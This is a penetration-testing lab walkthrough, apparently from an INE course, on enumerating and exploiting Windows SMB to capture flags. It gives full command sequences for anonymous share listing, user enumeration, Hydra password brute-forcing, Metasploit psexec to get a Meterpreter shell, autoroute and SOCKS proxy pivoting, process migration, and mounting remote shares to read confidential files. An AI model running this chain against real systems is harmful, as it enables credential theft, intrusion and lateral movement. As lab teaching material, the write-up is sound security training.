# NetBIOS Hacking (SMB & NetBios enum)

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 3832–3943. Examples are lab-specific and need verification.

You will learn to enumerate the SMB service and exploit it using different brute-forcing and exploitation tools. Also, it covers pivoting and how to leverage net utility to mount the shared drives in the pivot network.

In this lab environment, the user will access a Kali GUI instance. A vulnerable SMB service can be accessed using the tools installed on Kali on [http://demo.ine.local] and [http://demo1.ine.local.]

**Objective:** Exploit both the target and find the flag!

**Tools: msf, nmap, hydra, proxychains**

WannaCry, a well-known ransomware attack, exploited vulnerabilities in the SMBv1 protocol to infect other systems

```bash
ping -c 5 demo.ine.local    //reachable
ping -c 5 demo1.ine.local
nmap demo.ine.local

#By default, the SMB service uses either IP port 139 or 445. Also, it is by default installed and present in every windows operating system. However, we can disable or remove it from the system.

nmap -sV -p 139,445 demo.ine.local

#identified that the target is Microsoft Windows Server 2008 R2 - 2012
nmap -p445 --script smb-protocols demo.ine.local
#We can notice that all three versions are accessible.

nmap -p445 --script smb-security-mode demo.ine.local
#There is one more interesting nmap script for the smb protocol to find the security level of the protocol.

smbclient -L demo.ine.local
Password for [WORKGROUP\root]: <enter>
# we can access anonymous login Now, we have anonymous access to the target machine. We can smoothly dump all the present windows users using the nmap script.
nmap -p445 --script smb-enum-users.nse demo.ine.local
#There are a total of four users present. admin, administrator, root, and guest
#Now, let's find the valid password for admin, administrator, and root user.
nano users.txt
admin
administrator
root
cat users.txt
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
#-L list of users & -P password
#successfully retrieved 3 users pass
#Now, we can use the Metasploit framework and run the psexec exploit module to gain the meterpreter shell using the administrator user valid password.

msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit

meterpreter>getuid, sysinfo
cat C:\\Users\\Administrator\\Documents\\FLAG1.txt

#demo.ine.local: 10.0.19.243
#demo1.ine.local : 10.0.28.125

shell
ping 10.0.28.125

#We can access the demo1.ine.local machine, i.e., 10.0.28.125.
However, we cannot access that machine (10.0.28.125) from the Kali machine. So, here we need to perform **pivoting by adding route** from the Metasploit framework.

CTRL + C
y
run autoroute -s 10.0.28.125**/20**
#we have successfully added the route to access the demo1.ine.local machine
cat /etc/proxychains4.conf
#we can notice socks4 port 9050

background
use auxiliary/server/socks_proxy
show options

set SRVPORT 9050
set VERSION 4a
exploit
jobs
#the server is running perfectly
#Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine, i.e. demo1.ine.local
We could also specify multiple ports. But, in this case, we are only interested in SMB service.

proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
#Proxychains: a Linux tool that forces any program’s network connections through a configured chain of proxies (SOCKS4/5, HTTP) by preloading a redirect library to anonymize or route traffic.
#445 port is open

msf6 auxiliary(server/socks_proxy)>
sessions -i 1
shell
net view 10.0.28.125           //access is denied
#Well, currently, we are running as NT AUTHORITY\SYSTEM privilege. Let's migrate the process into explorer.exe and reaccess it.

CTRL + C
migrate -N explorer.exe
shell
net view 10.0.28.125
#two shared resources Documents and K drive
net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$
#We successfully mapped the resources to D and K drives.

dir D:
dir K:

CTRL + C
cat D:\\Confidential.txt
cat D:\\FLAG2.txt
S
```

This file is the ultimate proof for the client. The organization files are not safe. Therefore, policies and proper configurations should be implemented inside and outside the perimeter.
